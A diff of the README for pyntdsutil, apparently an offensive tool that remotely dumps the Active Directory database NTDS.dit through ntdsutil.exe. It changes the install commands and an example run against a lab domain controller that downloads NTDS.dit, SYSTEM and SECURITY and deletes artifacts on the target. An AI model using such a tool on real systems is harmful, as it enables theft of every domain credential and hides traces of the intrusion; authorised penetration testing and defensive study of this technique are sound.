@@ -6,22 +6,21 @@ Dump NTDS.dit remotely with ntdsutil.exe via a modified version of atexec.py.
 
 ```ruby
 python3 -m pip install pipx && python3 -m pipx ensurepath
-git clone https://github.com/mrdanielvelez/pyntdsutil
-cd pyntdsutil && python3 -m pipx install .
+python3 -m pipx install git+https://github.com/mrdanielvelez/pyntdsutil
 ```
 
 ## Example Output
 
 ```javascript
-# pyntdsutil CRASH.LAB/Administrator:'Welcome1234!'@192.168.40.136
+# pyntdsutil CRASH.LAB/Administrator:'Welcome1234!'@192.168.40.136      
 [*] Connected to 192.168.40.136 as CRASH.LAB\Administrator (Admin!)
 [*] Dumping NTDS.dit with ntdsutil.exe
-[*] NTDS.dit successfully dumped
+[*] Successfully dumped NTDS.dit
 [*] Downloading NTDS.dit, SYSTEM, and SECURITY
-[*] Output NTDS dump files to dump_2023-10-08_23:36:16_pyntdsutil
-[*] Deleted artifacts on target domain controller
+[*] Output files to pyntdsutil_2023-10-12_00:17:22
+[*] Deleted artifacts on 192.168.40.136
 
-# ls dump_2023-10-08_23:36:16_pyntdsutil
+# ls output_pyntdsutil_2023-10-08 
 NTDS.dit  SECURITY  SYSTEM
 ```
 
